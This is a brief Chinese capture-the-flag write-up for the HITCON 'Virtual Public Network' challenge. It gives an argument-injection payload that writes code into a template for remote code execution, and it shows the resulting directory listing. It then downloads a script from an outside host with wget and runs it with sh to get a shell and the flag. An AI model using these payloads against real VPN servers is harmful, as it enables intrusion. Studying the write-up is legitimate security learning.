# Virtual Public Network

這題其實根本是簽到題，只要看完 Orange 的 Paper 就能解了

`-r$x="ls /",system$x# 2>./tmp/kaibro.thtml <` 可以寫進 template

然後在 backdoor 的地方去 require 就能 RCE

=> `$READ_FLAG$ FLAG bin boot dev etc home initrd.img initrd.img.old lib lib64 lost+found media mnt opt proc root run sbin snap srv sys tmp usr var vmlinuz vmlinuz.old`

繞`$`，可以簡單 Reverse shell 一下即可

`wget kaibro.tw -O /tmp/kaibro`

`sh /tmp/kaibro`

=> `hitcon{Now I'm sure u saw my Bl4ck H4t p4p3r :P}`

